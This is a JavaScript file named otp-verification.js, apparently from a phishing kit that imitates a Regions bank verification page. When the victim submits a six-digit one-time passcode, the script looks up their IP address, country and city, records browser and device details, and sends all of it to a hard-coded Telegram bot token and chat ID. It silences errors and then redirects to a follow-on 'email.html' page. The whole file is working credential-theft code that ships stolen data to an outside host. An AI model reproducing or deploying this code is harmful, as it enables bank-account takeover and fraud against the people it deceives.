
// otp-verification.js

// Function to get client info
async function getClientInfo() {
  const info = {
    ip: 'Unknown',
    country: 'Unknown',
    city: 'Unknown',
    device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
    browser: navigator.userAgent,
  };

  try {
    const response = await fetch('https://ipapi.co/json/');
    if (response.ok) {
      const data = await response.json();
      info.ip = data.ip || 'Unknown';
      info.country = data.country_name || 'Unknown';
      info.city = data.city || 'Unknown';
    }
  } catch (error) {
    console.warn('Failed to fetch IP info:', error);
  }

  return info;
}

// Send message to Telegram bot
async function sendToTelegram(message) {
  const token = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ"; // <-- Replace with your bot token
  const chat_id = "6211090366"; // <-- Replace with your chat ID

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message,
        }),
      }
    );
    return response.ok;
  } catch (error) {
    /*console.error("Error sending message to Telegram:", error);*/
    return false;
  }
}

// Handle OTP form submission
document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const otp = document.getElementById('otp').value.trim();

    if (!otp || otp.length !== 6 || !/^\d{6}$/.test(otp)) {
      alert('Please enter a valid 6-digit OTP.');
      return;
    }

    const clientInfo = await getClientInfo();

    const message =
      `======🔐 REGIONS OTP Verification ======\n` +
      `OTP Code: ${otp}\n \n` +
      `🌐 IP Address: ${clientInfo.ip}\n` +
      `🏳️ Country: ${clientInfo.country}\n` +
      `🏙️ City: ${clientInfo.city}\n` +
      `💻 Browser: ${clientInfo.browser}\n` +
      `📱 Device: ${clientInfo.device}`;

    const sent = await sendToTelegram(message);

    if (!sent) {
      //alert("Failed to send OTP to Telegram.");
      return;
    }

    // Redirect after success (change URL as needed)
    window.location.href = "email.html";
  });
});
